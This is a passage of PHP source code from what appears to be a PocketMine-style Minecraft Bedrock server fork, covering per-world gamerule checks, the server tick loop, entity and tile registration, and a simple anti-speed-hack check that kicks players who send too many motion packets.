		$worlds = [];
		foreach($value as $world){
			$world = $this->normalizeWorldName($world);
			if($world !== ""){
				$worlds[$world] = true;
			}
		}

		return array_keys($worlds);
	}

	public function isWorldBehaviorDisabled($level, string $behavior) : bool{
		if(!isset($this->worldBehaviorConfig[$behavior]) or count($this->worldBehaviorConfig[$behavior]) === 0){
			return false;
		}

		$names = [];
		if($level instanceof Level){
			$names[] = $level->getFolderName();
			try{
				$names[] = $level->getName();
			}catch(\Throwable $e){
			}
		}elseif(is_object($level)){
			if(method_exists($level, "getFolderName")){
				$names[] = $level->getFolderName();
			}
			if(method_exists($level, "getName")){
				$names[] = $level->getName();
			}
		}else{
			$names[] = $level;
		}

		foreach($names as $name){
			if(in_array($this->normalizeWorldName($name), $this->worldBehaviorConfig[$behavior], true)){
				return true;
			}
		}

		return false;
	}

	public function isWorldNaturalMobSpawnDisabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "doMobSpawning");
		if($override !== null){
			return !$this->getWorldGamerule($level, "doMobSpawning");
		}

		return $this->isWorldBehaviorDisabled($level, "no-natural-mob-spawn");
	}

	public function isWorldMobDeathDropsAndExperienceDisabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "doMobLoot");
		if($override !== null){
			return !$this->getWorldGamerule($level, "doMobLoot");
		}

		return $this->isWorldBehaviorDisabled($level, "no-mob-death-drops-and-experience");
	}

	public function isWorldCreeperBlockDamageDisabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "mobGriefing");
		if($override !== null){
			return !$this->getWorldGamerule($level, "mobGriefing");
		}

		return $this->isWorldBehaviorDisabled($level, "no-creeper-block-damage");
	}

	public function isWorldTntBlockDamageDisabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "tnTExplodes");
		if($override !== null){
			return !$this->getWorldGamerule($level, "tnTExplodes");
		}

		return $this->isWorldBehaviorDisabled($level, "no-tnt-block-damage");
	}

	public function isWorldHungerHealthRegenerationDisabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "naturalRegeneration");
		if($override !== null){
			return !$this->getWorldGamerule($level, "naturalRegeneration");
		}

		return $this->isWorldBehaviorDisabled($level, "no-hunger-health-regeneration");
	}

	public function isWorldCropGrowthDisabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "randomTickSpeed");
		if($override !== null){
			return $this->getWorldGamerule($level, "randomTickSpeed") <= 0;
		}

		return $this->isWorldBehaviorDisabled($level, "no-crop-growth");
	}

	public function isWorldNonLivingEntityDropsDisabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "doEntityDrops");
		if($override !== null){
			return !$this->getWorldGamerule($level, "doEntityDrops");
		}

		return $this->isWorldBehaviorDisabled($level, "no-non-living-entity-drops");
	}

	public function isWorldKeepInventoryEnabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "keepInventory");
		if($override !== null){
			return $this->getWorldGamerule($level, "keepInventory");
		}

		return $this->keepInventory or $this->isWorldBehaviorDisabled($level, "keep-inventory");
	}

	public function isWorldKeepExperienceEnabled($level) : bool{
		return $this->keepExperience or $this->isWorldKeepInventoryEnabled($level);
	}

	public function isWorldDaylightCycleDisabled($level) : bool{
		$override = $this->getWorldGameruleOverride($level, "doDaylightCycle");
		if($override !== null){
			return !$this->getWorldGamerule($level, "doDaylightCycle");
		}

		return $this->isWorldBehaviorDisabled($level, "do-daylight-cycle");
	}

	public function getRedstonePulseTickDelay() : int{
		return max(1, (int) round(max(0.05, (float) $this->pulseFrequency) * 20));
	}

	public function updateQuery(){
		try{
			$this->getPluginManager()->callEvent($this->queryRegenerateTask = new QueryRegenerateEvent($this, 5));
			if($this->queryHandler !== null){
				$this->queryHandler->regenerateInfo();
			}
		}catch(\Throwable $e){
			$this->logger->logException($e);
		}
	}
	

	/**
	 * Tries to execute a server tick
	 */
	/*private function tick(){
		$tickTime = microtime(true);
		if(($tickTime - $this->nextTick) < -0.025){ //Allow half a tick of diff
			return false;
		}

		Timings::$serverTickTimer->startTiming();

		++$this->tickCounter;

		$this->checkConsole();

		Timings::$connectionTimer->startTiming();
		$this->network->processInterfaces();
		if($this->isSynapseEnabled()){
			$this->synapse->tick();
		}

		if($this->rcon !== null){
			$this->rcon->check();
		}

		Timings::$connectionTimer->stopTiming();

		Timings::$schedulerTimer->startTiming();
		$this->scheduler->mainThreadHeartbeat($this->tickCounter);
		Timings::$schedulerTimer->stopTiming();

		$this->checkTickUpdates($this->tickCounter, $tickTime);

		foreach($this->players as $player){
			$player->checkNetwork();
		}

		if(($this->tickCounter & 0b1111) === 0){
			$this->titleTick();
			$this->maxTick = 20;
			$this->maxUse = 0;

			if(($this->tickCounter & 0b111111111) === 0){
				if(($this->dserverConfig["enable"] and $this->dserverConfig["queryTickUpdate"]) or !$this->dserverConfig["enable"]){
					$this->updateQuery();
				}
			}

			$this->getNetwork()->updateName();
		}

		if($this->autoSave and ++$this->autoSaveTicker >= $this->autoSaveTicks){
			$this->autoSaveTicker = 0;
			$this->doAutoSave();
		}

		/*if($this->sendUsageTicker > 0 and --$this->sendUsageTicker === 0){
			$this->sendUsageTicker = 6000;
			$this->sendUsage(SendUsageTask::TYPE_STATUS);
		}
		
		//原注释尾

		if(($this->tickCounter % 100) === 0){
			foreach($this->levels as $level){
				$level->clearCache();
			}

			if($this->getTicksPerSecondAverage() < 1){
				$this->logger->warning($this->getLanguage()->translateString("pocketmine.server.tickOverload"));
			}
		}

		if($this->dispatchSignals and $this->tickCounter % 5 === 0){
			pcntl_signal_dispatch();
		}

		$this->getMemoryManager()->check();

		Timings::$serverTickTimer->stopTiming();

		$now = microtime(true);
		$tick = min(20, 1 / max(0.001, $now - $tickTime));
		$use = min(1, ($now - $tickTime) / 0.05);

		//TimingsHandler::tick($tick <= $this->profilingTickRate);

		if($this->maxTick > $tick){
			$this->maxTick = $tick;
		}

		if($this->maxUse < $use){
			$this->maxUse = $use;
		}

		array_shift($this->tickAverage);
		$this->tickAverage[] = $tick;
		array_shift($this->useAverage);
		$this->useAverage[] = $use;

		if(($this->nextTick - $tickTime) < -1){
			$this->nextTick = $tickTime;
		}else{
			$this->nextTick += 0.05;
		}

		return true;
	}*/
	
	private function tick(){
		$tickTime = microtime(true);
		if(($tickTime - $this->nextTick) < -0.025){ //Allow half a tick of diff
			return false;
		}

		Timings::$serverTickTimer->startTiming();

		++$this->tickCounter;

		$this->checkConsole();

		Timings::$connectionTimer->startTiming();
		$this->network->processInterfaces();

		if($this->rcon !== null){
			$this->rcon->check();
		}

		Timings::$connectionTimer->stopTiming();

		Timings::$schedulerTimer->startTiming();
		$this->scheduler->mainThreadHeartbeat($this->tickCounter);
		Timings::$schedulerTimer->stopTiming();
		$this->checkTickUpdates($this->tickCounter, $tickTime);
		
		foreach($this->players as $player){
			$player->checkNetwork();
		}
		
		if(($this->tickCounter & 0b1111) === 0){
			$this->checkDos();
			$this->titleTick();
			$this->maxTick = 20;
			$this->maxUse = 0;

			if(($this->tickCounter & 0b111111111) === 0){
				if(($this->dserverConfig["enable"] and $this->dserverConfig["queryTickUpdate"]) or !$this->dserverConfig["enable"]){
					$this->updateQuery();
				}
			}

			$this->getNetwork()->updateName();
		}

		if($this->autoSave and ++$this->autoSaveTicker >= $this->autoSaveTicks){
			$this->autoSaveTicker = 0;
			$this->doAutoSave();
		}
		
		

		/*if($this->sendUsageTicker > 0 and --$this->sendUsageTicker === 0){
			$this->sendUsageTicker = 6000;
			$this->sendUsage(SendUsageTask::TYPE_STATUS);
		}*/
		if(($this->tickCounter % 100) === 0){
			if($this->antiGameSpeed){
				$this->checkGameSpeed($this->tickCounter);
			}
			foreach($this->levels as $level){
				$level->clearCache();
			}
			
			if($this->getTicksPerSecondAverage() < 1){
				$this->logger->warning($this->getLanguage()->translateString("pocketmine.server.tickOverload"));
			}
		}

		if($this->dispatchSignals and $this->tickCounter % 5 === 0){
			pcntl_signal_dispatch();
		}

		$this->getMemoryManager()->check();

		Timings::$serverTickTimer->stopTiming();

		$now = microtime(true);
		$tick = min(20, 1 / max(0.001, $now - $tickTime));
		$use = min(1, ($now - $tickTime) / 0.05);
		//TimingsHandler::tick($tick <= $this->profilingTickRate);

		if($this->maxTick > $tick){
			$this->maxTick = $tick;
		}

		if($this->maxUse < $use){
			$this->maxUse = $use;
		}

		array_shift($this->tickAverage);
		$this->tickAverage[] = $tick;
		array_shift($this->useAverage);
		$this->useAverage[] = $use;

		if(($this->nextTick - $tickTime) < -1){
			$this->nextTick = $tickTime;
		}else{
			$this->nextTick += 0.05;
		}

		return true;
	}

	private function registerEntities(){
		Entity::registerEntity(Arrow::class);
		Entity::registerEntity(DroppedItem::class);
		Entity::registerEntity(FallingSand::class);
		Entity::registerEntity(PrimedTNT::class);
		Entity::registerEntity(Snowball::class);
		Entity::registerEntity(Fireball::class);
		Entity::registerEntity(SmallFireball::class);
		Entity::registerEntity(Villager::class);
		Entity::registerEntity(Zombie::class);
		Entity::registerEntity(Squid::class);
		Entity::registerEntity(Chicken::class);
		Entity::registerEntity(Cow::class);
		Entity::registerEntity(Pig::class);
		Entity::registerEntity(Horse::class);
		Entity::registerEntity(Sheep::class);
		Entity::registerEntity(Wolf::class);
		Entity::registerEntity(Mooshroom::class);
		Entity::registerEntity(Creeper::class);
		Entity::registerEntity(Husk::class);
		Entity::registerEntity(Skeleton::class);
		Entity::registerEntity(Stray::class);
		Entity::registerEntity(Spider::class);
		Entity::registerEntity(PigZombie::class);
		Entity::registerEntity(Slime::class);
		Entity::registerEntity(Enderman::class);
		Entity::registerEntity(Silverfish::class);
		Entity::registerEntity(CaveSpider::class);
		Entity::registerEntity(Ghast::class);
		Entity::registerEntity(LavaSlime::class);
		Entity::registerEntity(Bat::class);
		Entity::registerEntity(Blaze::class);
		Entity::registerEntity(Witch::class);
		Entity::registerEntity(Ocelot::class);
		Entity::registerEntity(SnowGolem::class);
		Entity::registerEntity(IronGolem::class);
		Entity::registerEntity(Lightning::class);
		Entity::registerEntity(XPOrb::class);
		Entity::registerEntity(ThrownExpBottle::class);
		Entity::registerEntity(Boat::class);
		Entity::registerEntity(Minecart::class);
		Entity::registerEntity(ThrownPotion::class);
		Entity::registerEntity(Painting::class);
		Entity::registerEntity(FishingHook::class);
		Entity::registerEntity(Egg::class);
		Entity::registerEntity(ZombieVillager::class);
		Entity::registerEntity(Rabbit::class);
		Entity::registerEntity(MinecartChest::class);
		Entity::registerEntity(MinecartHopper::class);
		Entity::registerEntity(MinecartTNT::class);
		Entity::registerEntity(LeashKnot::class);

		Entity::registerEntity(Human::class, true);
		Entity::registerEntity(Bot::class, true);
	}

	private function registerTiles(){
		Tile::registerTile(BrewingStand::class);
		Tile::registerTile(Chest::class);
		Tile::registerTile(Furnace::class);
		Tile::registerTile(Sign::class);
		Tile::registerTile(EnchantTable::class);
		Tile::registerTile(FlowerPot::class);
		Tile::registerTile(Skull::class);
		Tile::registerTile(MobSpawner::class);
		Tile::registerTile(Hopper::class);
		Tile::registerTile(ItemFrame::class);
		Tile::registerTile(Dispenser::class);
		Tile::registerTile(Dropper::class);
		Tile::registerTile(DLDetector::class);
		Tile::registerTile(Cauldron::class);
		Tile::registerTile(MinecartChestTile::class);
		Tile::registerTile(Comparator::class);
		Tile::registerTile(PistonArm::class);
		Tile::registerTile(MovingBlockTile::class);
	}

	public function checkGameSpeed($tick){
		foreach($this->getOnlinePlayers() as $player){
			$time = microtime(true);
			$elapsed = $time - $player->motionPacketLastCheck;
			if($player->motionPacketLastCheck > 0 and $elapsed > 0){
				$rate = $player->motionPacketCount / $elapsed;
				if($rate >= 175){
					$player->kick("服务器不允许加速");
				}
			}
			$player->motionPacketLastCheck = $time;
			$player->motionPacketCount = 0;
		}
	}
}
